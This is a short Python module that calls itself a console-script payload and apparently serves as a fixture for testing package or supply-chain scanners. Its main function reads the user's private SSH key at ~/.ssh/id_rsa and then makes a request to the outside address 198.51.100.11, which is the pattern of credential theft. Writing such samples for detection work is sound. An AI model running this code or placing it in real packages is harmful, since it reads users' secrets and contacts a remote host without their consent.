"""Console-script payload. Importing the module does not exfiltrate."""
import os
import sys
import urllib.request


def main() -> int:
    if "--help" in sys.argv:
        return 0
    try:
        open(os.path.expanduser("~/.ssh/id_rsa"), encoding="utf-8").read()
        urllib.request.urlopen("http://198.51.100.11/cli", timeout=2)
    except OSError:
        return 1
    return 0
